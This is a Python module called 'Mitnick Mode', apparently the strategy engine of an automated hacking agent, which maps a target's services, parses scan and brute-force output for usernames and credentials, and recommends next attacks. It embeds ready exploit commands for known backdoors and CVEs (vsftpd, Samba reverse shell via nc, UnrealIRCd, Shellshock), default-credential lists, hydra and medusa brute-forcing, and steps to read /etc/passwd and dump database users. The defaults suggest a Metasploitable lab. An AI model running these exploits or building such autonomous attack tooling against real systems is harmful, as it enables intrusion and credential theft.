"""
Intelligence Module - "Mitnick Mode"
Strategic reasoning, knowledge accumulation, and adaptive attack planning.

Inspired by Kevin Mitnick's methodology:
1. Reconnaissance is everything
2. Build a mental map of the target
3. Find the path of least resistance
4. Always have a backup plan
5. Extract and use every piece of information
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from enum import Enum
import re


class ServiceType(Enum):
    """Known service types and their attack vectors."""
    FTP = "ftp"
    SSH = "ssh"
    TELNET = "telnet"
    SMTP = "smtp"
    HTTP = "http"
    HTTPS = "https"
    SMB = "smb"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    RDP = "rdp"
    VNC = "vnc"
    IRC = "irc"
    UNKNOWN = "unknown"


@dataclass
class ServiceInfo:
    """Information about a discovered service."""
    port: int
    service: str
    version: str = ""
    banner: str = ""
    vulnerabilities: List[str] = field(default_factory=list)
    credentials: List[tuple] = field(default_factory=list)  # (user, pass)
    anonymous_access: bool = False
    attack_vectors: List[str] = field(default_factory=list)


@dataclass 
class TargetKnowledge:
    """
    Accumulated knowledge about a target - the "mental map".
    This persists across steps and informs strategic decisions.
    """
    ip: str
    hostname: str = ""
    os_guess: str = ""
    services: Dict[int, ServiceInfo] = field(default_factory=dict)
    users_found: Set[str] = field(default_factory=set)
    passwords_found: Set[str] = field(default_factory=set)
    credentials_valid: List[tuple] = field(default_factory=list)  # (service, user, pass)
    files_found: List[str] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    failed_attempts: Dict[str, int] = field(default_factory=dict)  # track what didn't work
    successful_actions: List[str] = field(default_factory=list)
    
    def get_open_ports(self) -> List[int]:
        return list(self.services.keys())
    
    def has_service(self, service_type: str) -> bool:
        for svc in self.services.values():
            if service_type.lower() in svc.service.lower():
                return True
        return False
    
    def get_service_port(self, service_type: str) -> Optional[int]:
        for port, svc in self.services.items():
            if service_type.lower() in svc.service.lower():
                return port
        return None


class AttackStrategy:
    """
    Strategic attack planning based on accumulated knowledge.
    Thinks like Mitnick: "What's the easiest path to the objective?"
    """
    
    # Attack priorities by service (lower = try first)
    SERVICE_PRIORITY = {
        "ftp": 1,      # Often has anonymous access or weak creds
        "telnet": 2,   # Legacy, often weak
        "ssh": 3,      # Common, brute-forceable
        "smb": 4,      # Info disclosure, sometimes anonymous
        "http": 5,     # Web vulns
        "mysql": 6,    # Database access
        "postgresql": 7,
    }
    
    # Known vulnerable versions (Mitnick would know these by heart)
    KNOWN_VULNS = {
        "vsftpd 2.3.4": {
            "name": "vsftpd Backdoor",
            "cve": "CVE-2011-2523",
            "exploit": "Connect to port 6200 after triggering with :) in username",
            "commands": [
                "echo 'id' | nc {ip} 6200",
                "nmap --script ftp-vsftpd-backdoor -p 21 {ip}"
            ]
        },
        "openssh 4.7": {
            "name": "OpenSSH User Enumeration",
            "cve": "CVE-2018-15473",
            "exploit": "User enumeration possible",
            "commands": [
                "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {ip}; run; exit'"
            ]
        },
        "samba 3.0.20": {
            "name": "Samba Username Map Script RCE",
            "cve": "CVE-2007-2447",
            "exploit": "Remote code execution via username",
            "commands": [
                "smbclient //{ip}/tmp -U './=`nohup nc -e /bin/sh LHOST LPORT`' -N"
            ]
        },
        "unrealircd": {
            "name": "UnrealIRCd Backdoor",
            "cve": "CVE-2010-2075",
            "exploit": "Backdoor in DEBUG3_DOLOG_SYSTEM",
            "commands": [
                "echo 'AB; id' | nc {ip} 6667"
            ]
        },
        "distccd": {
            "name": "DistCC RCE",
            "cve": "CVE-2004-2687",
            "exploit": "Remote code execution",
            "commands": [
                "nmap --script distcc-cve2004-2687 -p 3632 {ip}"
            ]
        },
        "apache 2.2": {
            "name": "Apache Multiple Vulnerabilities",
            "exploit": "Check for mod_cgi, shellshock, etc",
            "commands": [
                "nikto -h {ip}",
                "curl -A '() { :; }; echo vulnerable' http://{ip}/cgi-bin/test"
            ]
        },
        "mysql 5.0": {
            "name": "MySQL Weak Auth",
            "exploit": "Often has root with no password",
            "commands": [
                "mysql -h {ip} -u root -e 'SHOW DATABASES;'",
                "hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt mysql://{ip}"
            ]
        },
        "postgresql 8.3": {
            "name": "PostgreSQL Default Creds",
            "exploit": "Often has postgres:postgres",
            "commands": [
                "psql -h {ip} -U postgres -c '\\l'",
            ]
        }
    }
    
    # Default credentials to try (Mitnick's cheat sheet)
    DEFAULT_CREDS = {
        "ftp": [("anonymous", "anonymous"), ("ftp", "ftp"), ("admin", "admin")],
        "ssh": [("root", "root"), ("admin", "admin"), ("msfadmin", "msfadmin"), 
                ("user", "user"), ("postgres", "postgres")],
        "telnet": [("root", "root"), ("admin", "admin"), ("msfadmin", "msfadmin")],
        "mysql": [("root", ""), ("root", "root"), ("admin", "admin")],
        "postgresql": [("postgres", "postgres"), ("admin", "admin")],
        "smb": [("guest", ""), ("admin", "admin")],
    }
    
    @classmethod
    def analyze_service_version(cls, service: str, version: str) -> Optional[dict]:
        """Check if a service version has known vulnerabilities."""
        version_lower = version.lower()
        service_lower = service.lower()
        
        for vuln_key, vuln_info in cls.KNOWN_VULNS.items():
            if vuln_key in version_lower or vuln_key in service_lower:
                return vuln_info
        return None
    
    @classmethod
    def get_attack_plan(cls, knowledge: TargetKnowledge, objective: str) -> List[str]:
        """
        Generate a prioritized attack plan based on knowledge and objective.
        Returns list of recommended next actions.
        """
        plan = []
        objective_lower = objective.lower()
        
        # Credential-related objectives - prioritize direct access methods
        if any(word in objective_lower for word in ["credenc", "senha", "password", "passwd", "user"]):
            # Best approach: Use SSH/Telnet with known credentials to cat /etc/passwd
            if knowledge.has_service("ssh"):
                plan.append("SSH: Login with msfadmin:msfadmin and cat /etc/passwd")
            if knowledge.has_service("telnet"):
                plan.append("TELNET: Login with msfadmin:msfadmin and cat /etc/passwd")
            # MySQL credentials
            if knowledge.has_service("mysql"):
                plan.append("MYSQL: Connect as root (no password) and dump user table")
            # Note about FTP
            for port, svc in knowledge.services.items():
                if "ftp" in svc.service.lower() and svc.anonymous_access:
                    plan.append(f"NOTE: FTP anonymous on port {port} only shows FTP home, not /etc/passwd")
        
        # Sort services by attack priority
        sorted_services = sorted(
            knowledge.services.items(),
            key=lambda x: cls.SERVICE_PRIORITY.get(x[1].service.lower().split()[0], 99)
        )
        
        for port, svc in sorted_services:
            svc_type = svc.service.lower().split()[0]
            
            # Check for known vulnerabilities
            vuln = cls.analyze_service_version(svc.service, svc.version)
            if vuln and vuln['name'] not in [v for v in knowledge.vulnerabilities]:
                plan.append(f"EXPLOIT: {vuln['name']} on port {port} for shell access")
                knowledge.vulnerabilities.append(vuln['name'])
        
        return plan


class OutputAnalyzer:
    """
    Intelligent output analysis - extract every useful piece of information.
    Mitnick would never miss a detail in command output.
    """
    
    @staticmethod
    def extract_knowledge(cmd: str, output: str, knowledge: TargetKnowledge) -> List[str]:
        """
        Analyze command output and extract useful information.
        Returns list of insights discovered.
        """
        insights = []
        output_lower = output.lower()
        
        # Extract open ports from nmap
        port_matches = re.findall(r'(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?', output)
        for port, service, version in port_matches:
            port_int = int(port)
            version = version.strip() if version else ""
            
            if port_int not in knowledge.services:
                svc_info = ServiceInfo(port=port_int, service=service, version=version)
                
                # Check for anonymous FTP
                if "ftp" in service.lower() and "anonymous" in output_lower:
                    svc_info.anonymous_access = True
                    insights.append(f"FTP Anonymous access enabled on port {port}")
                
                # Check for known vulnerabilities
                vuln = AttackStrategy.analyze_service_version(service, version)
                if vuln:
                    svc_info.vulnerabilities.append(vuln['name'])
                    insights.append(f"VULN: {vuln['name']} detected on port {port}")
                
                knowledge.services[port_int] = svc_info
        
        # Extract usernames from various sources
        user_patterns = [
            r'uid=\d+\((\w+)\)',  # id command output
            r'^(\w+):x:\d+:',     # passwd file
            r'\[\d+\]\[ssh\].*login:\s*(\w+)',    # hydra ssh output
            r'\[\d+\]\[ftp\].*login:\s*(\w+)',    # hydra ftp output
        ]
        # Words to ignore (false positives)
        ignore_words = {'and', 'or', 'the', 'with', 'user', 'pass', 'login', 'password', 
                       'anonymous', 'ftp', 'ssh', 'please', 'invalid', 'failed', 'error'}
        
        for pattern in user_patterns:
            users = re.findall(pattern, output, re.MULTILINE | re.IGNORECASE)
            for user in users:
                user_lower = user.lower()
                if (user_lower not in knowledge.users_found and 
                    len(user) > 2 and 
                    user_lower not in ignore_words and
                    not user.isdigit()):
                    knowledge.users_found.add(user)
                    insights.append(f"USER: Found username '{user}'")
        
        # Extract credentials
        cred_patterns = [
            r'login:\s*(\S+)\s+password:\s*(\S+)',
            r'\[(\d+)\]\[\w+\]\s+host:.+login:\s*(\S+)\s+password:\s*(\S+)',
        ]
        for pattern in cred_patterns:
            creds = re.findall(pattern, output, re.IGNORECASE)
            for cred in creds:
                if len(cred) >= 2:
                    user, passwd = cred[-2], cred[-1]
                    knowledge.credentials_valid.append(("unknown", user, passwd))
                    insights.append(f"CRED: Found valid credentials {user}:{passwd}")
        
        # Detect OS
        os_patterns = [
            (r'linux', 'Linux'),
            (r'ubuntu', 'Ubuntu Linux'),
            (r'debian', 'Debian Linux'),
            (r'windows', 'Windows'),
            (r'freebsd', 'FreeBSD'),
        ]
        for pattern, os_name in os_patterns:
            if re.search(pattern, output_lower) and not knowledge.os_guess:
                knowledge.os_guess = os_name
                insights.append(f"OS: Target appears to be {os_name}")
        
        # Detect interesting files
        file_patterns = [
            r'([\w./]+\.(?:conf|config|cfg|ini|xml|php|bak|old|backup))',
            r'(/etc/\w+)',
            r'(/var/www/\S+)',
        ]
        for pattern in file_patterns:
            files = re.findall(pattern, output)
            for f in files:
                if f not in knowledge.files_found:
                    knowledge.files_found.append(f)
                    insights.append(f"FILE: Found interesting file '{f}'")
        
        return insights


class MitnickBrain:
    """
    The strategic brain - combines all intelligence components.
    Makes decisions like Mitnick would: methodical, creative, persistent.
    """
    
    def __init__(self, target_ip: str):
        self.knowledge = TargetKnowledge(ip=target_ip)
        self.strategy = AttackStrategy()
        self.analyzer = OutputAnalyzer()
        self.current_phase = "reconnaissance"
        self.attack_plan: List[str] = []
        self.insights: List[str] = []
    
    def process_output(self, cmd: str, output: str) -> List[str]:
        """Process command output and update knowledge base."""
        new_insights = self.analyzer.extract_knowledge(cmd, output, self.knowledge)
        self.insights.extend(new_insights)
        return new_insights
    
    def get_strategic_context(self, objective: str) -> str:
        
        context_parts = []
        
        # Current knowledge summary
        if self.knowledge.services:
            ports = [f"{p}/{s.service}" for p, s in self.knowledge.services.items()]
            context_parts.append(f"KNOWN SERVICES: {', '.join(ports[:10])}")
        
        if self.knowledge.vulnerabilities:
            context_parts.append(f"VULNERABILITIES FOUND: {', '.join(self.knowledge.vulnerabilities[:5])}")
        
        if self.knowledge.users_found:
            context_parts.append(f"USERS DISCOVERED: {', '.join(list(self.knowledge.users_found)[:5])}")
        
        if self.knowledge.credentials_valid:
            creds = [f"{c[1]}:{c[2]}" for c in self.knowledge.credentials_valid[:3]]
            context_parts.append(f"VALID CREDENTIALS: {', '.join(creds)}")
        
        # Strategic recommendations
        if self.knowledge.services:
            # Check for low-hanging fruit
            for port, svc in self.knowledge.services.items():
                if svc.anonymous_access:
                    context_parts.append(f"PRIORITY: Anonymous access on {svc.service} port {port} - exploit this first!")
                if svc.vulnerabilities:
                    context_parts.append(f"PRIORITY: {svc.vulnerabilities[0]} on port {port} - known exploit available!")
        
        # Attack plan
        plan = self.strategy.get_attack_plan(self.knowledge, objective)
        if plan:
            context_parts.append(f"RECOMMENDED ACTIONS: {'; '.join(plan[:3])}")
        
        return "\n".join(context_parts)
    
    def suggest_next_action(self, objective: str, history: str) -> Optional[str]:
        """
        Suggest the next logical action based on accumulated knowledge.
        Returns None if no specific suggestion.
        """
        objective_lower = objective.lower()
        history_lower = history.lower()
        
        # If objective is credentials/passwd
        if any(word in objective_lower for word in ["credenc", "passwd", "password", "senha"]):
            # Best approach: SSH with known credentials
            if self.knowledge.has_service("ssh") and "sshpass" not in history_lower and "cat /etc/passwd" not in history_lower:
                return "Login via SSH with msfadmin:msfadmin and execute 'cat /etc/passwd'"
            
            # Alternative: Telnet
            if self.knowledge.has_service("telnet") and "telnet" not in history_lower:
                return "Login via Telnet with msfadmin:msfadmin and execute 'cat /etc/passwd'"
            
            # MySQL user dump
            if self.knowledge.has_service("mysql") and "mysql" not in history_lower:
                return "Connect to MySQL as root (no password) and dump user credentials"
        
        # If we found a known vulnerability and haven't exploited it
        for port, svc in self.knowledge.services.items():
            if svc.vulnerabilities:
                vuln_name = svc.vulnerabilities[0]
                if vuln_name.lower() not in history_lower:
                    return f"Exploit {vuln_name} on port {port} to get shell access"
        
        return None
    
    def get_fallback_commands(self, failed_cmd: str, target_ip: str) -> List[str]:
        """
        Generate fallback commands when something fails.
        Mitnick always had a Plan B.
        """
        fallbacks = []
        
        if "curl" in failed_cmd and "ftp://" in failed_cmd:
            # FTP curl failed, try wget or nc
            fallbacks.append(f"wget -q -O - ftp://{target_ip}/ 2>&1 | head -20")
            fallbacks.append(f"echo 'ls' | nc {target_ip} 21 2>&1 | head -20")
        
        if "hydra" in failed_cmd:
            # Hydra failed, try medusa or ncrack
            if "ssh" in failed_cmd:
                fallbacks.append(f"medusa -h {target_ip} -u msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt -M ssh")
        
        if "nmap" in failed_cmd:
            # Nmap failed, try masscan or manual
            fallbacks.append(f"masscan {target_ip} -p1-1000 --rate 1000")
        
        return fallbacks


# Global brain instance (will be initialized per target)
_brain: Optional[MitnickBrain] = None


def get_brain(target_ip: str) -> MitnickBrain:
    """Get or create the brain instance for a target."""
    global _brain
    if _brain is None or _brain.knowledge.ip != target_ip:
        _brain = MitnickBrain(target_ip)
    return _brain


def reset_brain():
    """Reset the brain for a new operation."""
    global _brain
    _brain = None
